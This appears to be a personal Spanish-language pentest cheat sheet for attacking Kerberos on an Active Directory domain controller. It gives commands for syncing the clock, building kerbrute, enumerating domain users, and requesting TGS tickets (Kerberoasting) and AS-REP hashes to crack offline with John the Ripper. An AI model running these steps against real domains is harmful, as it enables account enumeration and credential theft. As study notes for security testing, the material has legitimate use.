# Kerberos 

Tags: #Kerberos #DC #Windows 

Este es el puerto para Kerberos, que es el protocolo de autenticación predeterminado usado en AD. Kerberos es vital para el proceso de inicio de sesión y la concesión de tickets de acceso.
## Sincronizar el reloj 

```bash 
Nota: Antes de iniciar al ataque debemos de sincronizar el reloj de la maquina de atacante con el AD

❯ ntpdate IP     # Sincronizar el reloj 

	# IP = Dirección IP del DC

❯ date -s "2025-01-04 15:30:00"   # Restablecer la fecha y hora
```

## Kerbrute 

```bash 
❯ git clone https://github.com/ropnop/kerbrute           # Descargar la herramienta
❯ go build .                                             # Entrar al dir 'kerbrute' y compilarlo 
```

```bash 
❯ kerbrute userenum -d domain1.corp --dc IP user.txt   # Enumerar y verificar usuarios validos en el dominio 


Notas: 
	1. Se puede usar el diccionario de 'Names.txt' de Seclist 
	2. Si el usuario no cuenta con autenticacion previa de Kerberos, la herramienta arroja el TGT (hash) y este se puede crackear offline con 'John The Ripper'
```

## Solcitar un TGS con un usuario valido 

```bash 
❯ GetUsersSPNs domain1.corp/user:password            # Verificar si el DC es kerberostable en algún usuario

❯ GetUsersSPNs domain1.corp/user:password -request   # Solicitar un TGS y en offline crackearlo con John 
```